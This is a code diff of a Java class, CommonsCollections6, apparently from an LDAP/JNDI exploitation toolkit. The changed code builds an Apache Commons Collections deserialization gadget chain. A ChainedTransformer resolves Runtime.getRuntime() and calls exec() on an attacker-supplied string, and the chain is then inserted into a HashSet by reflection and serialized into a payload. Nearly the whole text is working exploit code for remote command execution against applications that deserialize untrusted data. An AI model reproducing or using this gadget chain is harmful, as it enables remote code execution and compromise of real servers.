@@ -1,15 +1,19 @@
 package com.feihong.ldap.gadgets;
 
 import com.feihong.ldap.enumtypes.PayloadType;
-import com.feihong.ldap.gadgets.utils.Gadgets;
 import com.feihong.ldap.gadgets.utils.Reflections;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Map;
 
 public class CommonsCollections6 {
@@ -21,26 +25,69 @@ public class CommonsCollections6 {
     }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(type, param);
+        final String[] execArgs = new String[] {String.valueOf(type)};
 
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        HashMap<String, String> innerMap = new HashMap<String, String>();
-        Map m = LazyMap.decorate(innerMap, transformer);
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
 
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "aaa");
+        Transformer transformerChain = new ChainedTransformer(transformers);
 
-        Map outerMap = new HashMap();
-        TiedMapEntry tied = new TiedMapEntry(m, tpl);
-        outerMap.put(tied, "bbb");
-        // clear the inner map data, this is important
-        innerMap.clear();
+        final Map innerMap = new HashMap();
 
-        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        HashSet map = new HashSet(1);
+        map.add("foo");
+        Field f = null;
+        try {
+            f = HashSet.class.getDeclaredField("map");
+        } catch (NoSuchFieldException e) {
+            f = HashSet.class.getDeclaredField("backingMap");
+        }
+
+        Reflections.setAccessible(f);
+        HashMap innimpl = (HashMap) f.get(map);
+
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField("table");
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField("elementData");
+        }
+
+        Reflections.setAccessible(f2);
+        Object[] array = (Object[]) f2.get(innimpl);
+
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field keyField = null;
+        try{
+            keyField = node.getClass().getDeclaredField("key");
+        }catch(Exception e){
+            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+        }
+
+        Reflections.setAccessible(keyField);
+        keyField.set(node, entry);
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baous);
-        oos.writeObject(outerMap);
+        oos.writeObject(map);
         byte[] bytes = baous.toByteArray();
         oos.close();
 
